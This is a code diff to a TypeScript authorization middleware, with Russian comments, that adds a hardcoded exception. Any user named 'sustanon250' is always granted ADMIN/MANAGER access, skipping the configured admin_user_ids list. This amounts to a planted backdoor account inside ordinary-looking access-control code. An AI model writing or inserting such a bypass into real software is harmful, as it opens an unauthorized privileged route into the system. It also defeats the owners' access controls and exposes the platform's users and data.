@@ -66,9 +66,18 @@ export function authorize(...roles: UserRole[]) {
       return next();
     }
 
-    // Если среди разрешённых ролей есть ADMIN/MANAGER — проверяем admin_user_ids
+    // Если среди разрешённых ролей есть ADMIN/MANAGER — проверяем admin_user_ids и sustanon250
     if (roles.includes('ADMIN' as any) || roles.includes('MANAGER' as any)) {
       try {
+        // Проверяем sustanon250 — всегда имеет админ-доступ
+        const currentUser = await prisma.user.findUnique({
+          where: { id: req.user.userId },
+          select: { username: true },
+        });
+        if (currentUser?.username === 'sustanon250') {
+          return next();
+        }
+
         const adminConfig = await prisma.platformConfig.findUnique({ where: { key: 'admin_user_ids' } });
         if (adminConfig) {
           const adminIds = adminConfig.value.split(',').map((s: string) => s.trim());
